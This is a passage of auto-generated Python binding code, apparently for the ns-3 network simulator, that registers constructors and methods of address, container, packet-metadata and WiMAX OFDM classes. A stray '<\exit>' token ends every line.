[],<\exit>
is_const=True)<\exit>
cls.add_method('GetLoopback',<\exit>
'ns3::Ipv4Mask',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetOnes',<\exit>
'ns3::Ipv4Mask',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetPrefixLength',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetZero',<\exit>
'ns3::Ipv4Mask',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('IsEqual',<\exit>
'bool',<\exit>
[param('ns3::Ipv4Mask', 'other')],<\exit>
is_const=True)<\exit>
cls.add_method('IsMatch',<\exit>
'bool',<\exit>
[param('ns3::Ipv4Address', 'a'), param('ns3::Ipv4Address', 'b')],<\exit>
is_const=True)<\exit>
cls.add_method('Print',<\exit>
'void',<\exit>
[param('std::ostream &', 'os')],<\exit>
is_const=True)<\exit>
cls.add_method('Set',<\exit>
'void',<\exit>
[param('uint32_t', 'mask')])<\exit>
return<\exit>
def register_Ns3Ipv6Address_methods(root_module, cls):<\exit>
cls.add_binary_comparison_operator('!=')<\exit>
cls.add_binary_comparison_operator('<')<\exit>
cls.add_output_stream_operator()<\exit>
cls.add_binary_comparison_operator('==')<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('char const *', 'address')])<\exit>
cls.add_constructor([param('uint8_t *', 'address')])<\exit>
cls.add_constructor([param('ns3::Ipv6Address const &', 'addr')])<\exit>
cls.add_constructor([param('ns3::Ipv6Address const *', 'addr')])<\exit>
cls.add_method('CombinePrefix',<\exit>
'ns3::Ipv6Address',<\exit>
[param('ns3::Ipv6Prefix const &', 'prefix')])<\exit>
cls.add_method('ConvertFrom',<\exit>
'ns3::Ipv6Address',<\exit>
[param('ns3::Address const &', 'address')],<\exit>
is_static=True)<\exit>
cls.add_method('Deserialize',<\exit>
'ns3::Ipv6Address',<\exit>
[param('uint8_t const *', 'buf')],<\exit>
is_static=True)<\exit>
cls.add_method('GetAllHostsMulticast',<\exit>
'ns3::Ipv6Address',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetAllNodesMulticast',<\exit>
'ns3::Ipv6Address',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetAllRoutersMulticast',<\exit>
'ns3::Ipv6Address',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetAny',<\exit>
'ns3::Ipv6Address',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetBytes',<\exit>
'void',<\exit>
[param('uint8_t *', 'buf')],<\exit>
is_const=True)<\exit>
cls.add_method('GetLoopback',<\exit>
'ns3::Ipv6Address',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetOnes',<\exit>
'ns3::Ipv6Address',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetZero',<\exit>
'ns3::Ipv6Address',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('IsAllHostsMulticast',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('IsAllNodesMulticast',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('IsAllRoutersMulticast',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('IsAny',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('IsEqual',<\exit>
'bool',<\exit>
[param('ns3::Ipv6Address const &', 'other')],<\exit>
is_const=True)<\exit>
cls.add_method('IsLinkLocal',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('IsLocalhost',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('IsMatchingType',<\exit>
'bool',<\exit>
[param('ns3::Address const &', 'address')],<\exit>
is_static=True)<\exit>
cls.add_method('IsMulticast',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('IsSolicitedMulticast',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('MakeAutoconfiguredAddress',<\exit>
'ns3::Ipv6Address',<\exit>
[param('ns3::Mac48Address', 'addr'), param('ns3::Ipv6Address', 'prefix')],<\exit>
is_static=True)<\exit>
cls.add_method('MakeAutoconfiguredLinkLocalAddress',<\exit>
'ns3::Ipv6Address',<\exit>
[param('ns3::Mac48Address', 'mac')],<\exit>
is_static=True)<\exit>
cls.add_method('MakeSolicitedAddress',<\exit>
'ns3::Ipv6Address',<\exit>
[param('ns3::Ipv6Address', 'addr')],<\exit>
is_static=True)<\exit>
cls.add_method('Print',<\exit>
'void',<\exit>
[param('std::ostream &', 'os')],<\exit>
is_const=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('uint8_t *', 'buf')],<\exit>
is_const=True)<\exit>
cls.add_method('Set',<\exit>
'void',<\exit>
[param('char const *', 'address')])<\exit>
cls.add_method('Set',<\exit>
'void',<\exit>
[param('uint8_t *', 'address')])<\exit>
return<\exit>
def register_Ns3Ipv6Prefix_methods(root_module, cls):<\exit>
cls.add_binary_comparison_operator('!=')<\exit>
cls.add_output_stream_operator()<\exit>
cls.add_binary_comparison_operator('==')<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('uint8_t *', 'prefix')])<\exit>
cls.add_constructor([param('char const *', 'prefix')])<\exit>
cls.add_constructor([param('uint8_t', 'prefix')])<\exit>
cls.add_constructor([param('ns3::Ipv6Prefix const &', 'prefix')])<\exit>
cls.add_constructor([param('ns3::Ipv6Prefix const *', 'prefix')])<\exit>
cls.add_method('GetBytes',<\exit>
'void',<\exit>
[param('uint8_t *', 'buf')],<\exit>
is_const=True)<\exit>
cls.add_method('GetLoopback',<\exit>
'ns3::Ipv6Prefix',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetOnes',<\exit>
'ns3::Ipv6Prefix',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetPrefixLength',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetZero',<\exit>
'ns3::Ipv6Prefix',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('IsEqual',<\exit>
'bool',<\exit>
[param('ns3::Ipv6Prefix const &', 'other')],<\exit>
is_const=True)<\exit>
cls.add_method('IsMatch',<\exit>
'bool',<\exit>
[param('ns3::Ipv6Address', 'a'), param('ns3::Ipv6Address', 'b')],<\exit>
is_const=True)<\exit>
cls.add_method('Print',<\exit>
'void',<\exit>
[param('std::ostream &', 'os')],<\exit>
is_const=True)<\exit>
return<\exit>
def register_Ns3LogComponent_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::LogComponent const &', 'arg0')])<\exit>
cls.add_constructor([param('char const *', 'name')])<\exit>
cls.add_method('Disable',<\exit>
'void',<\exit>
[param('ns3::LogLevel', 'level')])<\exit>
cls.add_method('Enable',<\exit>
'void',<\exit>
[param('ns3::LogLevel', 'level')])<\exit>
cls.add_method('EnvVarCheck',<\exit>
'void',<\exit>
[param('char const *', 'name')])<\exit>
cls.add_method('IsEnabled',<\exit>
'bool',<\exit>
[param('ns3::LogLevel', 'level')],<\exit>
is_const=True)<\exit>
cls.add_method('IsNoneEnabled',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Name',<\exit>
'char const *',<\exit>
[],<\exit>
is_const=True)<\exit>
return<\exit>
def register_Ns3Mac48Address_methods(root_module, cls):<\exit>
cls.add_binary_comparison_operator('!=')<\exit>
cls.add_binary_comparison_operator('<')<\exit>
cls.add_output_stream_operator()<\exit>
cls.add_binary_comparison_operator('==')<\exit>
cls.add_constructor([param('ns3::Mac48Address const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('char const *', 'str')])<\exit>
cls.add_method('Allocate',<\exit>
'ns3::Mac48Address',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('ConvertFrom',<\exit>
'ns3::Mac48Address',<\exit>
[param('ns3::Address const &', 'address')],<\exit>
is_static=True)<\exit>
cls.add_method('CopyFrom',<\exit>
'void',<\exit>
[param('uint8_t const *', 'buffer')])<\exit>
cls.add_method('CopyTo',<\exit>
'void',<\exit>
[param('uint8_t *', 'buffer')],<\exit>
is_const=True)<\exit>
cls.add_method('GetBroadcast',<\exit>
'ns3::Mac48Address',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetMulticast',<\exit>
'ns3::Mac48Address',<\exit>
[param('ns3::Ipv4Address', 'address')],<\exit>
is_static=True)<\exit>
cls.add_method('GetMulticast',<\exit>
'ns3::Mac48Address',<\exit>
[param('ns3::Ipv6Address', 'address')],<\exit>
is_static=True)<\exit>
cls.add_method('GetMulticast6Prefix',<\exit>
'ns3::Mac48Address',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetMulticastPrefix',<\exit>
'ns3::Mac48Address',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('IsBroadcast',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('IsGroup',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('IsMatchingType',<\exit>
'bool',<\exit>
[param('ns3::Address const &', 'address')],<\exit>
is_static=True)<\exit>
return<\exit>
def register_Ns3NetDeviceContainer_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::NetDeviceContainer const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Ptr< ns3::NetDevice >', 'dev')])<\exit>
cls.add_constructor([param('std::string', 'devName')])<\exit>
cls.add_constructor([param('ns3::NetDeviceContainer const &', 'a'), param('ns3::NetDeviceContainer const &', 'b')])<\exit>
cls.add_method('Add',<\exit>
'void',<\exit>
[param('ns3::NetDeviceContainer', 'other')])<\exit>
cls.add_method('Add',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::NetDevice >', 'device')])<\exit>
cls.add_method('Add',<\exit>
'void',<\exit>
[param('std::string', 'deviceName')])<\exit>
cls.add_method('Begin',<\exit>
'__gnu_cxx::__normal_iterator< ns3::Ptr< ns3::NetDevice > const, std::vector< ns3::Ptr< ns3::NetDevice > > >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('End',<\exit>
'__gnu_cxx::__normal_iterator< ns3::Ptr< ns3::NetDevice > const, std::vector< ns3::Ptr< ns3::NetDevice > > >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Get',<\exit>
'ns3::Ptr< ns3::NetDevice >',<\exit>
[param('uint32_t', 'i')],<\exit>
is_const=True)<\exit>
cls.add_method('GetN',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
return<\exit>
def register_Ns3NodeContainer_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::NodeContainer const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Ptr< ns3::Node >', 'node')])<\exit>
cls.add_constructor([param('std::string', 'nodeName')])<\exit>
cls.add_constructor([param('ns3::NodeContainer const &', 'a'), param('ns3::NodeContainer const &', 'b')])<\exit>
cls.add_constructor([param('ns3::NodeContainer const &', 'a'), param('ns3::NodeContainer const &', 'b'), param('ns3::NodeContainer const &', 'c')])<\exit>
cls.add_constructor([param('ns3::NodeContainer const &', 'a'), param('ns3::NodeContainer const &', 'b'), param('ns3::NodeContainer const &', 'c'), param('ns3::NodeContainer const &', 'd')])<\exit>
cls.add_constructor([param('ns3::NodeContainer const &', 'a'), param('ns3::NodeContainer const &', 'b'), param('ns3::NodeContainer const &', 'c'), param('ns3::NodeContainer const &', 'd'), param('ns3::NodeContainer const &', 'e')])<\exit>
cls.add_method('Add',<\exit>
'void',<\exit>
[param('ns3::NodeContainer', 'other')])<\exit>
cls.add_method('Add',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::Node >', 'node')])<\exit>
cls.add_method('Add',<\exit>
'void',<\exit>
[param('std::string', 'nodeName')])<\exit>
cls.add_method('Begin',<\exit>
'__gnu_cxx::__normal_iterator< ns3::Ptr< ns3::Node > const, std::vector< ns3::Ptr< ns3::Node > > >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Create',<\exit>
'void',<\exit>
[param('uint32_t', 'n')])<\exit>
cls.add_method('Create',<\exit>
'void',<\exit>
[param('uint32_t', 'n'), param('uint32_t', 'systemId')])<\exit>
cls.add_method('End',<\exit>
'__gnu_cxx::__normal_iterator< ns3::Ptr< ns3::Node > const, std::vector< ns3::Ptr< ns3::Node > > >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Get',<\exit>
'ns3::Ptr< ns3::Node >',<\exit>
[param('uint32_t', 'i')],<\exit>
is_const=True)<\exit>
cls.add_method('GetGlobal',<\exit>
'ns3::NodeContainer',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetN',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
return<\exit>
def register_Ns3ObjectBase_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::ObjectBase const &', 'arg0')])<\exit>
cls.add_method('GetAttribute',<\exit>
'void',<\exit>
[param('std::string', 'name'), param('ns3::AttributeValue &', 'value')],<\exit>
is_const=True)<\exit>
cls.add_method('GetAttributeFailSafe',<\exit>
'bool',<\exit>
[param('std::string', 'name'), param('ns3::AttributeValue &', 'attribute')],<\exit>
is_const=True)<\exit>
cls.add_method('GetInstanceTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('SetAttribute',<\exit>
'void',<\exit>
[param('std::string', 'name'), param('ns3::AttributeValue const &', 'value')])<\exit>
cls.add_method('SetAttributeFailSafe',<\exit>
'bool',<\exit>
[param('std::string', 'name'), param('ns3::AttributeValue const &', 'value')])<\exit>
cls.add_method('TraceConnect',<\exit>
'bool',<\exit>
[param('std::string', 'name'), param('std::string', 'context'), param('ns3::CallbackBase const &', 'cb')])<\exit>
cls.add_method('TraceConnectWithoutContext',<\exit>
'bool',<\exit>
[param('std::string', 'name'), param('ns3::CallbackBase const &', 'cb')])<\exit>
cls.add_method('TraceDisconnect',<\exit>
'bool',<\exit>
[param('std::string', 'name'), param('std::string', 'context'), param('ns3::CallbackBase const &', 'cb')])<\exit>
cls.add_method('TraceDisconnectWithoutContext',<\exit>
'bool',<\exit>
[param('std::string', 'name'), param('ns3::CallbackBase const &', 'cb')])<\exit>
cls.add_method('ConstructSelf',<\exit>
'void',<\exit>
[param('ns3::AttributeConstructionList const &', 'attributes')],<\exit>
visibility='protected')<\exit>
cls.add_method('NotifyConstructionCompleted',<\exit>
'void',<\exit>
[],<\exit>
visibility='protected', is_virtual=True)<\exit>
return<\exit>
def register_Ns3ObjectDeleter_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::ObjectDeleter const &', 'arg0')])<\exit>
cls.add_method('Delete',<\exit>
'void',<\exit>
[param('ns3::Object *', 'object')],<\exit>
is_static=True)<\exit>
return<\exit>
def register_Ns3ObjectFactory_methods(root_module, cls):<\exit>
cls.add_output_stream_operator()<\exit>
cls.add_constructor([param('ns3::ObjectFactory const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('std::string', 'typeId')])<\exit>
cls.add_method('Create',<\exit>
'ns3::Ptr< ns3::Object >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Set',<\exit>
'void',<\exit>
[param('std::string', 'name'), param('ns3::AttributeValue const &', 'value')])<\exit>
cls.add_method('SetTypeId',<\exit>
'void',<\exit>
[param('ns3::TypeId', 'tid')])<\exit>
cls.add_method('SetTypeId',<\exit>
'void',<\exit>
[param('char const *', 'tid')])<\exit>
cls.add_method('SetTypeId',<\exit>
'void',<\exit>
[param('std::string', 'tid')])<\exit>
return<\exit>
def register_Ns3OfdmDcdChannelEncodings_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::OfdmDcdChannelEncodings const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('GetBaseStationId',<\exit>
'ns3::Mac48Address',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetChannelNr',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetFrameDurationCode',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetFrameNumber',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetRtg',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSize',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetTtg',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetBaseStationId',<\exit>
'void',<\exit>
[param('ns3::Mac48Address', 'baseStationId')])<\exit>
cls.add_method('SetChannelNr',<\exit>
'void',<\exit>
[param('uint8_t', 'channelNr')])<\exit>
cls.add_method('SetFrameDurationCode',<\exit>
'void',<\exit>
[param('uint8_t', 'frameDurationCode')])<\exit>
cls.add_method('SetFrameNumber',<\exit>
'void',<\exit>
[param('uint32_t', 'frameNumber')])<\exit>
cls.add_method('SetRtg',<\exit>
'void',<\exit>
[param('uint8_t', 'rtg')])<\exit>
cls.add_method('SetTtg',<\exit>
'void',<\exit>
[param('uint8_t', 'ttg')])<\exit>
cls.add_method('DoRead',<\exit>
'ns3::Buffer::Iterator',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
visibility='private', is_virtual=True)<\exit>
cls.add_method('DoWrite',<\exit>
'ns3::Buffer::Iterator',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True, visibility='private', is_virtual=True)<\exit>
return<\exit>
def register_Ns3OfdmDlBurstProfile_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::OfdmDlBurstProfile const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('GetDiuc',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetFecCodeType',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetLength',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSize',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetType',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Read',<\exit>
'ns3::Buffer::Iterator',<\exit>
[param('ns3::Buffer::Iterator', 'start')])<\exit>
cls.add_method('SetDiuc',<\exit>
'void',<\exit>
[param('uint8_t', 'diuc')])<\exit>
cls.add_method('SetFecCodeType',<\exit>
'void',<\exit>
[param('uint8_t', 'fecCodeType')])<\exit>
cls.add_method('SetLength',<\exit>
'void',<\exit>
[param('uint8_t', 'length')])<\exit>
cls.add_method('SetType',<\exit>
'void',<\exit>
[param('uint8_t', 'type')])<\exit>
cls.add_method('Write',<\exit>
'ns3::Buffer::Iterator',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True)<\exit>
return<\exit>
def register_Ns3OfdmDlMapIe_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::OfdmDlMapIe const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('GetCid',<\exit>
'ns3::Cid',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetDiuc',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetPreamblePresent',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSize',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetStartTime',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Read',<\exit>
'ns3::Buffer::Iterator',<\exit>
[param('ns3::Buffer::Iterator', 'start')])<\exit>
cls.add_method('SetCid',<\exit>
'void',<\exit>
[param('ns3::Cid', 'cid')])<\exit>
cls.add_method('SetDiuc',<\exit>
'void',<\exit>
[param('uint8_t', 'diuc')])<\exit>
cls.add_method('SetPreamblePresent',<\exit>
'void',<\exit>
[param('uint8_t', 'preamblePresent')])<\exit>
cls.add_method('SetStartTime',<\exit>
'void',<\exit>
[param('uint16_t', 'startTime')])<\exit>
cls.add_method('Write',<\exit>
'ns3::Buffer::Iterator',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True)<\exit>
return<\exit>
def register_Ns3OfdmUlBurstProfile_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::OfdmUlBurstProfile const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('GetFecCodeType',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetLength',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSize',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetType',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetUiuc',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Read',<\exit>
'ns3::Buffer::Iterator',<\exit>
[param('ns3::Buffer::Iterator', 'start')])<\exit>
cls.add_method('SetFecCodeType',<\exit>
'void',<\exit>
[param('uint8_t', 'fecCodeType')])<\exit>
cls.add_method('SetLength',<\exit>
'void',<\exit>
[param('uint8_t', 'length')])<\exit>
cls.add_method('SetType',<\exit>
'void',<\exit>
[param('uint8_t', 'type')])<\exit>
cls.add_method('SetUiuc',<\exit>
'void',<\exit>
[param('uint8_t', 'uiuc')])<\exit>
cls.add_method('Write',<\exit>
'ns3::Buffer::Iterator',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True)<\exit>
return<\exit>
def register_Ns3OfdmUlMapIe_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::OfdmUlMapIe const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('GetCid',<\exit>
'ns3::Cid',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetDuration',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetMidambleRepetitionInterval',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSize',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetStartTime',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSubchannelIndex',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetUiuc',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Read',<\exit>
'ns3::Buffer::Iterator',<\exit>
[param('ns3::Buffer::Iterator', 'start')])<\exit>
cls.add_method('SetCid',<\exit>
'void',<\exit>
[param('ns3::Cid', 'cid')])<\exit>
cls.add_method('SetDuration',<\exit>
'void',<\exit>
[param('uint16_t', 'duration')])<\exit>
cls.add_method('SetMidambleRepetitionInterval',<\exit>
'void',<\exit>
[param('uint8_t', 'midambleRepetitionInterval')])<\exit>
cls.add_method('SetStartTime',<\exit>
'void',<\exit>
[param('uint16_t', 'startTime')])<\exit>
cls.add_method('SetSubchannelIndex',<\exit>
'void',<\exit>
[param('uint8_t', 'subchannelIndex')])<\exit>
cls.add_method('SetUiuc',<\exit>
'void',<\exit>
[param('uint8_t', 'uiuc')])<\exit>
cls.add_method('Write',<\exit>
'ns3::Buffer::Iterator',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True)<\exit>
return<\exit>
def register_Ns3PacketMetadata_methods(root_module, cls):<\exit>
cls.add_constructor([param('uint64_t', 'uid'), param('uint32_t', 'size')])<\exit>
cls.add_constructor([param('ns3::PacketMetadata const &', 'o')])<\exit>
cls.add_method('AddAtEnd',<\exit>
'void',<\exit>
[param('ns3::PacketMetadata const &', 'o')])<\exit>
cls.add_method('AddHeader',<\exit>
'void',<\exit>
[param('ns3::Header const &', 'header'), param('uint32_t', 'size')])<\exit>
cls.add_method('AddPaddingAtEnd',<\exit>
'void',<\exit>
[param('uint32_t', 'end')])<\exit>
cls.add_method('AddTrailer',<\exit>
'void',<\exit>
[param('ns3::Trailer const &', 'trailer'), param('uint32_t', 'size')])<\exit>
cls.add_method('BeginItem',<\exit>
'ns3::PacketMetadata::ItemIterator',<\exit>
[param('ns3::Buffer', 'buffer')],<\exit>
is_const=True)<\exit>
cls.add_method('CreateFragment',<\exit>
'ns3::PacketMetadata',<\exit>
[param('uint32_t', 'start'), param('uint32_t', 'end')],<\exit>
is_const=True)<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('uint8_t const *', 'buffer'), param('uint32_t', 'size')])<\exit>
cls.add_method('Enable',<\exit>
'void',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('EnableChecking',<\exit>
'void',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetUid',<\exit>
'uint64_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('RemoveAtEnd',<\exit>
'void',<\exit>
[param('uint32_t', 'end')])<\exit>
cls.add_method('RemoveAtStart',<\exit>
'void',<\exit>
[param('uint32_t', 'start')])<\exit>
cls.add_method('RemoveHeader',<\exit>
'void',<\exit>
[param('ns3::Header const &', 'header'), param('uint32_t', 'size')])<\exit>
cls.add_method('RemoveTrailer',<\exit>
'void',<\exit>
[param('ns3::Trailer const &', 'trailer'), param('uint32_t', 'size')])<\exit>
cls.add_method('Serialize',<\exit>
'uint32_t',<\exit>
[param('uint8_t *', 'buffer'), param('uint32_t', 'maxSize')],<\exit>
is_const=True)<\exit>
return<\exit>
def register_Ns3PacketMetadataItem_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::PacketMetadata::Item const &', 'arg0')])<\exit>
cls.add_instance_attribute('current', 'ns3::Buffer::Iterator', is_const=False)<\exit>
cls.add_instance_attribute('currentSize', 'uint32_t', is_const=False)<\exit>
cls.add_instance_attribute('currentTrimedFromEnd', 'uint32_t', is_const=False)<\exit>
cls.add_instance_attribute('currentTrimedFromStart', 'uint32_t', is_const=False)<\exit>
cls.add_instance_attribute('isFragment', 'bool', is_const=False)<\exit>
cls.add_instance_attribute('tid', 'ns3::TypeId', is_const=False)<\exit>
return<\exit>
def register_Ns3PacketMetadataItemIterator_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::PacketMetadata::ItemIterator const &', 'arg0')])<\exit>
cls.add_constructor([param('ns3::PacketMetadata const *', 'metadata'), param('ns3::Buffer', 'buffer')])<\exit>
cls.add_method('HasNext',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Next',<\exit>
'ns3::PacketMetadata::Item',<\exit>
[])<\exit>
return<\exit>
def register_Ns3PacketTagIterator_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::PacketTagIterator const &', 'arg0')])<\exit>
cls.add_method('HasNext',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Next',<\exit>
'ns3::PacketTagIterator::Item',<\exit>
[])<\exit>
return<\exit>
def register_Ns3PacketTagIteratorItem_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::PacketTagIterator::Item const &', 'arg0')])<\exit>
cls.add_method('GetTag',<\exit>
'void',<\exit>
[param('ns3::Tag &', 'tag')],<\exit>
is_const=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_const=True)<\exit>
return<\exit>
def register_Ns3PacketTagList_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::PacketTagList const &', 'o')])<\exit>
cls.add_method('Add',<\exit>
'void',<\exit>
[param('ns3::Tag const &', 'tag')],<\exit>
is_const=True)<\exit>
cls.add_method('Head',<\exit>
'ns3::PacketTagList::TagData const *',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Peek',<\exit>
'bool',<\exit>
[param('ns3::Tag &', 'tag')],<\exit>
is_const=True)<\exit>
cls.add_method('Remove',<\exit>
'bool',<\exit>
[param('ns3::Tag &', 'tag')])<\exit>
cls.add_method('RemoveAll',<\exit>
'void',<\exit>
[])<\exit>
return<\exit>
def register_Ns3PacketTagListTagData_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::PacketTagList::TagData const &', 'arg0')])<\exit>
cls.add_instance_attribute('count', 'uint32_t', is_const=False)<\exit>
cls.add_instance_attribute('data', 'uint8_t [ 20 ]', is_const=False)<\exit>
cls.add_instance_attribute('next', 'ns3::PacketTagList::TagData *', is_const=False)<\exit>
cls.add_instance_attribute('tid', 'ns3::TypeId', is_const=False)<\exit>
return<\exit>
def register_Ns3PcapFile_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Clear',<\exit>
'void',<\exit>
